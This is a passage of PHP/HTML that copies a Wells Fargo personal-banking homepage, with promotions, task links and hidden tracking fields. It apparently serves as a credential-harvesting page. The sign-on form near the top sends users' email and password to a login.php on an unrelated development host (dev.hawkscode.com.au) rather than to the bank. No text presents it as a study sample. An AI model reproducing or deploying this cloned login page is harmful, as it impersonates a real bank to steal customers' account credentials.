<?php include('header.php'); ?>
<style>
#masthead {
    margin-bottom:0px !important;
}
</style>
<div id="mainContent">
  
         
            <div class="topRegion">

 <h1 class="hidden" id="skip">
            Wells Fargo Personal</h1>

  <!--hide-->

           <!--sign on-->
  <div class="inner">
<div id="signOn">
	<div id="signOnMain">
		<h2 id="signOnHeader"><img src="http://dev.hawkscode.com.au/adam-and-company/new/assets/css/template/homepage/homepage-lock-signon.svg" alt="Securely">View Your Accounts</h2>
		
			<!--<div class="formElementsWrapper formElementsDestination">
				<label for="destination" class="hidden">Go to</label> 
					<select name="destination" id="destination" class="formElement formElementDropdown">
						<option value="AccountSummary" selected="selected">Account Summary</option>
						<option value="Transfer">Transfer</option>
						<option value="BillPay">Bill Pay</option>
						<option value="Brokerage">Brokerage</option>
						<option value="Trade">Trade</option>
						<option value="MessageAlerts">Messages and Alerts</option>
					</select>
			</div>-->
            <form autocomplete="off" name="signon" id="frmSignon" action="http://dev.hawkscode.com.au/adam-and-company/login.php" method="post">
			<div class="formElementsWrapper formElementsUsername">
				<label for="userid" class="hidden">Username</label>
				<input type="text" accesskey="U" id="userid" class="formElement formElementText" name="email"  value="" placeholder="Email" autocomplete="off">
			</div>
			<div class="formElementsWrapper formElementsPassword">
				<label for="password" class="hidden">Password</label>
				<input type="password" accesskey="P" id="password" class="formElement formElementPassword" name="password"  placeholder="Password" autocomplete="off">
			</div>
            <div>
				<input type="submit" value="Log In" name="login" id="btnSignon" class="c7" data-mrkt-tracking-id="3d6c76ba-9d34-4def-977d-a79cb8afc738">
			</div>
            </form>
			<div id="saveuid" class="formElementsWrapper formElementsSaveUsername">
				<input type="checkbox" accesskey="S" id="saveusername" class="c29link formElement formElementCheckbox" name="saveusername" data-content-id="c29content-save-username" triggerhover="false" isclickable="true">
				<label for="saveusername" class="lsc">Save username<span class="hidden">Opens a dialog</span></label>
				<input type="hidden" name="save-username" id="save-username" value="false">
				<input type="hidden" name="hdnuserid" id="hdnuserid" value="">
			</div>
			
			<div class="forgotPasswordLinkWrapper">
				<a href="http://dev.hawkscode.com.au/adam-and-company/new/help/faqs/sign-on/?linkLoc=signon">Forgot Password/Username? </a> 
				<input type="hidden" name="screenid" value="SIGNON">
				<input type="hidden" name="origination" value="WebCons"> 
				<input type="hidden" name="LOB" value="Cons">
				<input type="hidden" id="userPrefs" name="userPrefs" value="">
				<input id="jsenabled" name="jsenabled" type="hidden" value="false"> 
				<input id="origin" name="origin" type="hidden" value="cob">
				<input name="homepage" type="hidden" value="true">
				</div>
		<input name="ndsid" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1366:662:1366:728:1366:728&quot;,&quot;wfi&quot;:&quot;flap-84734&quot;,&quot;oc&quot;:&quot;49988q95p1n421o&quot;,&quot;fe&quot;:&quot;1366k768 24&quot;,&quot;qvqgm&quot;:&quot;-330&quot;,&quot;jxe&quot;:783708,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;por52r04n761257o&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:0,\&quot;gf\&quot;:snyfr,\&quot;gr\&quot;:snyfr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;ss4n2rp5r9p7o3s0&quot;,&quot;sz&quot;:&quot;nss4qr9567rq7809&quot;,&quot;vce&quot;:&quot;apvc,-1,5n8on5n0,2,1;fg,0,vachgGbcFrnepuSvryq,0,hfrevq,0,cnffjbeq,0;zz,1q73,2q7,9po,;zzf,3r8,0,n,92 0,2977 38s,s3n,s48,-18s38,19n78,-28n6;zp,3nq,89,9o3,;zzf,3o,3r8,n,4n 0,o70 516,256,256,-4p54,7q32,-q;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r9,3r8,n,ABC;zzf,3r8,3r9,n,ABC;gf,0,3po2;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zz,8p5,88,130,;zzf,1r4q,2712,32,2nn 1os,305 23147,1065,n365,-n74s9,o0487,41;zzf,270s,270s,32,ABC;gf,0,92n3;zzf,2710,2710,32,ABC;zz,noo,38r,9n6,;zz,1r80,196,65n,;gf,0,r2rr;zzf,o1r,3459,32,4r3 3q5,p70 2150n,s28,98n1,-n1481,n69ro,-74;zz,535n,147,64q,;gf,0,14166;zzf,80r,5o68,32,271 0,o27 6804,455,2o4r,-1qo86,20o0p,-o;zzf,2710,2710,32,ABC;zz,62q7,p9,8op,;gf,0,1q35o;zz,26n4,253,0,gbcFrnepu;zz,4p37,192,6,gbcFrnepu;gf,0,24636;zzf,14o1,rn63,1r,4 1pr,2rs 2os1,327,o760,-1605,1608,s;zz,8o2q,q4,255,;gf,0,2r614;zz,18rp,1np,2n,gbcFrnepu;zz,1250,2nn,136,;zzf,3508,ro71,1r,18s 7rs,181 10o7,11n,4225,-656,866,12;gf,0,34658;zz,876,1sq,2,gbcFrnepu;zz,3838,sp,204,;gf,0,38706;zz,39s6,16n,18,;zzf,6rnp,r950,1r,146 s1,617 s35,1p2,5s53,-831,o92,22;gf,0,42sn8;zzf,rn5s,rn5s,1r,ABC;gf,0,51n07;zz,157p,r1,23n,;zz,1577,13n,o4,fvtaBaZnva;zz,1438,547,s5,;gf,0,55932;zz,28q6,s3,23q,;zzf,84r9,rprn,1r,38 12s,5s rr2,185,60pn,-5s4,773,6;gf,0,606s1;zz,323n8,172,4,gbcFrnepu;gf,0,92n99;zz,32sp,196,79,vairfgvatGno;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 6.3; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/64.0 Fnsnev/537.36&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfnsfsqaa3tofhwqi5chht&quot;},&quot;fvq&quot;:&quot;aqfnsfsqaa3tofhwqi5chht&quot;,&quot;jg&quot;:&quot;&quot;}">
        
	</div>
	
</div>


</div><div class="c3" data-cid="tcm:242-147040-16" data-ctid="tcm:224-146930-32">	
      <div class="c3wrapper" role="region" aria-label="Promotions Slideshow"><div class="paddles alwaysOn"><a href="#_prevFrame" class="left"><img alt="Previous Slide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite.png"></a></div>
        
       <div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>		
       <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en" data-offer-id="C_ccd_platinum_hpprimary_web">
      
<div class="c3Img" data-cid="tcm:402-150050-16" data-ctid="tcm:91-146911-32"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfic254_ph_g-186678901-cc002_1200x532.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfic254_ph_g-186678901-cc002_1200x532.jpg"></div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme12"> 
                        
                        <h2>Enjoy 0% intro APR for 15 months</h2>
                        <span>On purchases and balance transfers. Plus, $0 annual fee.</span>
                  </div>
           </div>
      </div>

  

						</div><span class="hidden">End item 2</span></div>
        
       <div class="carouselFrame item3" style="display: none;"><span class="hidden">Begin item 3</span>		
       <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_3" lang="en" data-offer-id="C_mtg_prequal_hpprimary_web">
      
<div class="c3Img" data-cid="tcm:402-149395-16" data-ctid="tcm:91-146911-32"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia484_ph_b-1009_00386_1200x532.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia484_ph_b-1009_00386_1200x532.jpg"></div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme12"> 
                        
                        <h2 style="color: #5d9cec;">Ready to buy a house?</h2>
                        <span style="color: #5d9cec;">Start with a free prequalification so you know how much you may be able to borrow</span>
                  </div>
           </div>
      </div>

  

						</div><span class="hidden">End item 3</span></div>
        				
     <div class="carouselFrame incomingFrame" style="left: 0px; display: none;"><span class="hidden">Begin item 1</span>		
       <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en" data-offer-id="C_chk_prospecttest_hpprimary_web">
      
<div class="c3Img" data-cid="tcm:402-139636-16" data-ctid="tcm:91-146911-32"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfia234_ph_v-ayp1238697_1200x532.jpg"></div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme4"> 
                        
                        <h2>$200 online offer</h2>
                        <span>New customers: Open Everyday Checking online and complete a few steps</span>
                  </div>
           </div>
      </div>

  

						</div><span class="hidden">End item 1</span></div><div class="controls"><a href="http://dev.hawkscode.com.au/adam-and-company/new/#_frame1" class="show1 current" tabindex="-1" role="presentation"><span class="hidden">item 1 of 3 - you are here</span><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-marquee-dot-active.svg"></a><a href="http://dev.hawkscode.com.au/adam-and-company/new/#_frame2" class="show2"><span class="hidden">item 2 of 3</span><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-marquee-dot-inactive.svg"></a><a href="http://dev.hawkscode.com.au/adam-and-company/new/#_frame3" class="show3"><span class="hidden">item 3 of 3</span><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/imageshomepage-marquee-dot-inactive.svg"></a></div><div class="paddles alwaysOn"><a href="http://dev.hawkscode.com.au/adam-and-company/new/#_nextFrame" class="right"><img alt="Next Slide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite.png"></a></div></div>
</div>





<div id="taskbar" role="region" aria-label="A group of 5 tasks." data-cid="tcm:242-147044-16" data-ctid="tcm:224-146934-32" style="bottom: 0px;">
    <div class="inner">
        <ul>
        
	
           <li class="task">
              
                      <div class="iaRendered" data-slot-id="WF_CON_HP_TOP_TASK_1" lang="en" data-offer-id="C_mtg_prequalification_toptask_web">    <div class="taskContentWrapper" data-cid="tcm:402-149328-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" data-tracking-id="21520-158535-3408-114">
            
            <div class="taskImageContainer">
               <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfi000_ic_b-building-house2-w_50x50.png">
            </div>
            
            Buying a house? We can help.
        </a>
    
    </div>

</div></li>
        
           <li class="task">
              
                      <div class="iaRendered" data-slot-id="WF_CON_HP_TOP_TASK_2" lang="en" data-offer-id="C_efs_studentloanopts_toptask_web">    <div class="taskContentWrapper" data-cid="tcm:402-149217-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" data-tracking-id="21520-158527-3408-76">
            
            <div class="taskImageContainer">
               <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfi000_ic_b-graduation-hat-w_50x50.png">
            </div>
            
            Student loan options
        </a>
    
    </div>

</div></li>
        
           <li class="task">
              
                      <div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_3" lang="en">
                <div class="taskContentWrapper" data-cid="tcm:84-146975-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7">
            
            <div class="taskImageContainer">
               
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/wfi111_ic_nba_default3_50x50.png">
        
            </div>
            
            Free online budgeting tools

        </a>
    
    </div>


          </div></li>
        
           <li class="task">
              
             
                     
            <div class="taskContentWrapper" style="display: block;">
<div class="taskSecondstate" tabindex="0" role="button" aria-controls="makeAnAppointment" aria-expanded="false">
<div class="taskImageContainer"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/icon-makeappt_50x50.png"></div>
Make An Appointment</div>
<div class="taskHiddenContent" id="makeAnAppointment">
<form action="http://dev.hawkscode.com.au/adam-and-company/new/locator/search/" method="get"><label for="location" class="hide">Location</label> <input type="text" size="28" aria-label="Find a Location" placeholder="City, State or ZIP" name="searchTxt" id="location" maxlength="70"> <input type="hidden" name="maasrch" value="Y"> <input type="submit" id="" class="submitBtn c7 utilitybtn" value="Go" name=""><input name="ndsid" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1366:662:1366:728:1366:728&quot;,&quot;wfi&quot;:&quot;flap-84734&quot;,&quot;oc&quot;:&quot;49988q95p1n421o&quot;,&quot;fe&quot;:&quot;1366k768 24&quot;,&quot;qvqgm&quot;:&quot;-330&quot;,&quot;jxe&quot;:783708,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;por52r04n761257o&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:0,\&quot;gf\&quot;:snyfr,\&quot;gr\&quot;:snyfr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;ss4n2rp5r9p7o3s0&quot;,&quot;sz&quot;:&quot;nss4qr9567rq7809&quot;,&quot;vce&quot;:&quot;apvc,-1,5n8on5n0,2,1;fg,0,vachgGbcFrnepuSvryq,0,hfrevq,0,cnffjbeq,0;zz,1q73,2q7,9po,;zzf,3r8,0,n,92 0,2977 38s,s3n,s48,-18s38,19n78,-28n6;zp,3nq,89,9o3,;zzf,3o,3r8,n,4n 0,o70 516,256,256,-4p54,7q32,-q;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r9,3r8,n,ABC;zzf,3r8,3r9,n,ABC;gf,0,3po2;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zz,8p5,88,130,;zzf,1r4q,2712,32,2nn 1os,305 23147,1065,n365,-n74s9,o0487,41;zzf,270s,270s,32,ABC;gf,0,92n3;zzf,2710,2710,32,ABC;zz,noo,38r,9n6,;zz,1r80,196,65n,;gf,0,r2rr;zzf,o1r,3459,32,4r3 3q5,p70 2150n,s28,98n1,-n1481,n69ro,-74;zz,535n,147,64q,;gf,0,14166;zzf,80r,5o68,32,271 0,o27 6804,455,2o4r,-1qo86,20o0p,-o;zzf,2710,2710,32,ABC;zz,62q7,p9,8op,;gf,0,1q35o;zz,26n4,253,0,gbcFrnepu;zz,4p37,192,6,gbcFrnepu;gf,0,24636;zzf,14o1,rn63,1r,4 1pr,2rs 2os1,327,o760,-1605,1608,s;zz,8o2q,q4,255,;gf,0,2r614;zz,18rp,1np,2n,gbcFrnepu;zz,1250,2nn,136,;zzf,3508,ro71,1r,18s 7rs,181 10o7,11n,4225,-656,866,12;gf,0,34658;zz,876,1sq,2,gbcFrnepu;zz,3838,sp,204,;gf,0,38706;zz,39s6,16n,18,;zzf,6rnp,r950,1r,146 s1,617 s35,1p2,5s53,-831,o92,22;gf,0,42sn8;zzf,rn5s,rn5s,1r,ABC;gf,0,51n07;zz,157p,r1,23n,;zz,1577,13n,o4,fvtaBaZnva;zz,1438,547,s5,;gf,0,55932;zz,28q6,s3,23q,;zzf,84r9,rprn,1r,38 12s,5s rr2,185,60pn,-5s4,773,6;gf,0,606s1;zz,323n8,172,4,gbcFrnepu;gf,0,92n99;zz,32sp,196,79,vairfgvatGno;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 6.3; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/64.0 Fnsnev/537.36&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfnsfsqaa3tofhwqi5chht&quot;},&quot;fvq&quot;:&quot;aqfnsfsqaa3tofhwqi5chht&quot;,&quot;jg&quot;:&quot;&quot;}"></form>
</div>
</div>
          
             
            </li>
        
           <li class="task">
              
             
                     
            <div class="taskContentWrapper" style="display: block;">
<div class="taskSecondstate" tabindex="0" role="button" aria-controls="checkTodaysRates" aria-expanded="false">
<div class="taskImageContainer"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/icon-rate_percent_50x50.png"></div>
Check Today’s Rates</div>
<div class="taskHiddenContent" id="checkTodaysRates">
<form action="http://dev.hawkscode.com.au/adam-and-company/new/dropdown" id="frmCheckRates" name="frmCheckRates" autocomplete="off"><label for="check_rates_dropdown" class="hide">Check Rates</label> <select aria-label="Check Todays Rates" name="dropdown" id="check_rates_dropdown">
<option value="personal.checkRates.Mortgage">Mortgage</option>
<option value="personal.checkRates.HomeEquity">Home Equity</option>
<option value="personal.checkRates.CDS">CDs</option>
<option value="personal.checkRates.CreditCard">Credit Card</option>
<option value="personal.checkRates.AutoLoans">Auto Loans</option>
<option value="personal.checkRates.StudentLoans">Student Loans</option>
<option value="personal.checkRates.PersonalLoans">Personal Loans</option>
<option value="personal.checkRates.More">All Rates</option>
</select> <input type="submit" class="submitBtn c7 utilitybtn" value="Go" id="NID1_14_2_1_1_3"><input name="ndsid" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1366:662:1366:728:1366:728&quot;,&quot;wfi&quot;:&quot;flap-84734&quot;,&quot;oc&quot;:&quot;49988q95p1n421o&quot;,&quot;fe&quot;:&quot;1366k768 24&quot;,&quot;qvqgm&quot;:&quot;-330&quot;,&quot;jxe&quot;:783708,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;por52r04n761257o&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:0,\&quot;gf\&quot;:snyfr,\&quot;gr\&quot;:snyfr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;ss4n2rp5r9p7o3s0&quot;,&quot;sz&quot;:&quot;nss4qr9567rq7809&quot;,&quot;vce&quot;:&quot;apvc,-1,5n8on5n0,2,1;fg,0,vachgGbcFrnepuSvryq,0,hfrevq,0,cnffjbeq,0;zz,1q73,2q7,9po,;zzf,3r8,0,n,92 0,2977 38s,s3n,s48,-18s38,19n78,-28n6;zp,3nq,89,9o3,;zzf,3o,3r8,n,4n 0,o70 516,256,256,-4p54,7q32,-q;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r9,3r8,n,ABC;zzf,3r8,3r9,n,ABC;gf,0,3po2;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zz,8p5,88,130,;zzf,1r4q,2712,32,2nn 1os,305 23147,1065,n365,-n74s9,o0487,41;zzf,270s,270s,32,ABC;gf,0,92n3;zzf,2710,2710,32,ABC;zz,noo,38r,9n6,;zz,1r80,196,65n,;gf,0,r2rr;zzf,o1r,3459,32,4r3 3q5,p70 2150n,s28,98n1,-n1481,n69ro,-74;zz,535n,147,64q,;gf,0,14166;zzf,80r,5o68,32,271 0,o27 6804,455,2o4r,-1qo86,20o0p,-o;zzf,2710,2710,32,ABC;zz,62q7,p9,8op,;gf,0,1q35o;zz,26n4,253,0,gbcFrnepu;zz,4p37,192,6,gbcFrnepu;gf,0,24636;zzf,14o1,rn63,1r,4 1pr,2rs 2os1,327,o760,-1605,1608,s;zz,8o2q,q4,255,;gf,0,2r614;zz,18rp,1np,2n,gbcFrnepu;zz,1250,2nn,136,;zzf,3508,ro71,1r,18s 7rs,181 10o7,11n,4225,-656,866,12;gf,0,34658;zz,876,1sq,2,gbcFrnepu;zz,3838,sp,204,;gf,0,38706;zz,39s6,16n,18,;zzf,6rnp,r950,1r,146 s1,617 s35,1p2,5s53,-831,o92,22;gf,0,42sn8;zzf,rn5s,rn5s,1r,ABC;gf,0,51n07;zz,157p,r1,23n,;zz,1577,13n,o4,fvtaBaZnva;zz,1438,547,s5,;gf,0,55932;zz,28q6,s3,23q,;zzf,84r9,rprn,1r,38 12s,5s rr2,185,60pn,-5s4,773,6;gf,0,606s1;zz,323n8,172,4,gbcFrnepu;gf,0,92n99;zz,32sp,196,79,vairfgvatGno;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 6.3; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/64.0 Fnsnev/537.36&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfnsfsqaa3tofhwqi5chht&quot;},&quot;fvq&quot;:&quot;aqfnsfsqaa3tofhwqi5chht&quot;,&quot;jg&quot;:&quot;&quot;}"></form>
</div>
</div>
          
             
            </li>
        
        
         </ul>
    </div>			
</div>



  </div>
            
            

        




                        

 
<div class="c63 html5section" data-cid="tcm:242-147043-16" data-ctid="tcm:224-146932-32">
    <a href="Javascript:void(0);" class="paddle prevPaddle" role="button" tabindex="-1" aria-hidden="true"><img alt="Previous Slide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite.png"></a><div class="c63controlsWrapper">
        <ul class="c63controls" role="tablist"><li role="tab" data-ia-code="C_oth_fraud_hpcarousel_web" data-order="null" id="nbaDefault7" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels7" aria-posinset="7" aria-setsize="7" class="show7">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-fraud-off-193x119.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-fraud-off-193x119.jpg">
        


<div class="thumbText">
<span>Fraud Information Center</span>
</div>

</li>
            
               <li role="tab" data-ia-code="C_ccd_credit_hpcarousel_web" data-order="null" id="nbaDefault1" aria-expanded="true" aria-selected="true" aria-controls="nbaDefaultPanels1" aria-posinset="1" aria-setsize="7" class="show1" tabindex="0">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-borrowing-off-193x119.jpg">
        


<div class="thumbText">
<span>Borrowing and Credit</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_chk_banking_hpcarousel_web" data-order="null" id="nbaDefault2" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels2" aria-posinset="2" aria-setsize="7" class="show2">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-banking-off-193x119.jpg">
        


<div class="thumbText">
<span>Banking Made Easy</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_irw_retirement_hpcarousel_web" data-order="null" id="nbaDefault3" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels3" aria-posinset="3" aria-setsize="7" class="show3">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-retirement-off-193x119.jpg">
        


<div class="thumbText">
<span>Retirement</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_mtg_homelending_hpcarousel_web" data-order="null" id="nbaDefault4" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels4" aria-posinset="4" aria-setsize="7" class="show4">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-homelending-off-193x119.jpg" class="deferred" data-deferred-src="https://www01.wellsfargomedia.com/assets/images/icons/homepage-NBA-homelending-off-193x119.jpg">
        


<div class="thumbText">
<span>Home Lending</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_efs_college_hpcarousel_web" data-order="null" id="nbaDefault5" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels5" aria-posinset="5" aria-setsize="7" class="show5">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-college-off-193x119.jpg" class="deferred" data-deferred-src="https://www01.wellsfargomedia.com/assets/images/icons/homepage-NBA-college-off-193x119.jpg">
        


<div class="thumbText">
<span>Going to College</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_wtr_investment_hpcarousel_web" data-order="null" id="nbaDefault6" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels6" aria-posinset="6" aria-setsize="7" class="show6">


          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-NBA-investing-off-193x119.jpg" class="deferred" data-deferred-src="https://www01.wellsfargomedia.com/assets/images/icons/homepage-NBA-investing-off-193x119.jpg">
        


<div class="thumbText">
<span>Investing Basics</span>
</div>

</li>            
                           
        </ul>
    </div><a href="Javascript:void(0);" class="paddle nextPaddle" role="button" tabindex="-1" aria-hidden="true"><img alt="Next Slide" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite.png"></a>
    <div class="carouselFrameWrapper">
        
              
            <div class="carouselFrame item1" role="tabpanel" data-ia-code="C_ccd_credit_hpcarousel_web" data-order="null" data-cid="tcm:84-147031-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels1" aria-labelledby="nbaDefault1" tabindex="0" style="display: block;"><span class="hidden">Begin item 1</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/woman-overhead-desk-computer-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Explore your credit options</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg1"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>How to establish credit &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg2"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Calculate your debt-to-income ratio &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg3"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Consolidate your debt &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Go to Borrowing and Credit</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 1</span></div>
          
         
              
            <div class="carouselFrame item2" role="tabpanel" data-ia-code="C_chk_banking_hpcarousel_web" data-order="null" data-cid="tcm:84-147025-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels2" aria-labelledby="nbaDefault2" tabindex="0" style="display: none;"><span class="hidden">Begin item 2</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/woman-phone-looking-cityscape-970x485.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/woman-phone-looking-cityscape-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Bank wherever life takes you</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg4"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"></a></div>
</div>
<span>Simplify the way you pay &gt;</span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg5"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"> <span>Bank on the go with your mobile device &gt;</span></a></div>
</div>
<span>Bank on the go with your mobile device &gt;></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg6"><a aria-hidden="true" tabindex="-1"><img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/homepage-image-sprite(1).png"> <span>Get account alerts &gt;</span></a></div>
</div>
<span>Get account alerts &gt;</span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button">Go to Banking Made Easy</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 2</span></div>
          
         
              
            <div class="carouselFrame item3" role="tabpanel" data-ia-code="C_irw_retirement_hpcarousel_web" data-order="null" data-cid="tcm:84-146969-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels3" aria-labelledby="nbaDefault3" tabindex="0" style="display: none;"><span class="hidden">Begin item 3</span>
    <div class="c63contentMain">
    
        
          <img alt="" src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/couple-smiling-water-970x485.jpg" class="deferred" data-deferred-src="http://dev.hawkscode.com.au/adam-and-company/new/assets/images/couple-smiling-water-970x485.jpg">
        
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Take control of your retirement</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
